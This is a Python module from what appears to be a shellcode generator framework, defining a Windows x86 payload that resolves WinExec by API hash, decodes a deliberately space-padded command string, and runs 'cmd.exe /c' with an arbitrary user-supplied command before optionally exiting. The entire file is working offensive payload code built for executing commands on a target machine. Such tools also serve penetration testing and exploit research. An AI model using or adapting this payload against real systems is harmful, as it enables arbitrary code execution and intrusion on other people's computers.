from payloads.Engine import Winx86Engine
from libs.Utilities import ShellcodeUtilities

class WinBlankexec(Winx86Engine):

	def __init__(self, output="a", template=None):
		super().__init__()

		self.info = {
		'Name':'windows_blankexec',
		'Description':'Decode and Execute an arbitrary command',
		'Args':'CMD',
		'Author':'Simone Cardona'
		}

		self.template = template
		self.output = output

	def windows_blankexec(self, *args):
		self.args = args
		CMD = self.parseOptions()
		exit = super().parseExit()
		
		# WinExec
		self.hash.append('0x0e8afe98')
		self.calls.append("[ebp+0x04]")

		super().header()
		super().mainFunction()

		self.payload += "jmp short GetCommand\n"
		self.payload += "CommandReturn:\n"
		self.payload += "pop esi\n"
		self.payload += "mov edi,esi\n"
		self.payload += "mov eax, edi\n"
		self.payload += super().zeroingRegister("ebx") + "\n"
		self.payload += "Here:\n"
		self.payload += "mov bl, byte [esi]\n"
		self.payload += "mov byte [edi], bl\n"
		self.payload += "add esi,2\n"
		self.payload += "inc edi\n"
		self.payload += "cmp byte [esi], 0x79\n"
		self.payload += "jb Here\n"
		self.payload += "mov byte [edi], 0x00\n"
		self.payload += "End:\n"
		self.payload += "mov ebx,eax\n"
		self.payload += super().zeroingRegister("eax") + "\n"
		self.payload += "push eax\n"
		self.payload += "push ebx\n"
		self.payload += "call %s\n" % self.calls[0]

		if exit != None:
			self.payload += "jmp ending\n"
		else:
			# ExitProcess
			self.hash.append("0x73e2d87e")
			self.calls.append("[ebp+0x08]")

			self.payload += "mov edi, [ebp]\n"
			super().call_findFunction(self.hash[1])
			self.payload += super().zeroingRegister("ecx") + "\n"
			self.payload += "push ecx\n"
			self.payload += "call %s\n" % self.calls[1]

		self.payload += "GetCommand:\n"
		self.payload += "call CommandReturn\n"
		self.payload += 'db "c m d . e x e   / c   %sz"\n' % CMD
		self.payload += "nop\n" * 2

		super().kernel32Base()
		super().findFunction(self.kernel32)
		super().footer()

		super().assemble(self.output)

	def parseOptions(self):
		for arg in self.args:
			for a in arg:
				if "CMD" in a:
					cmd = a.split("=")[1]
					cmd = " ".join(ShellcodeUtilities.splitAt(cmd,1))
					return cmd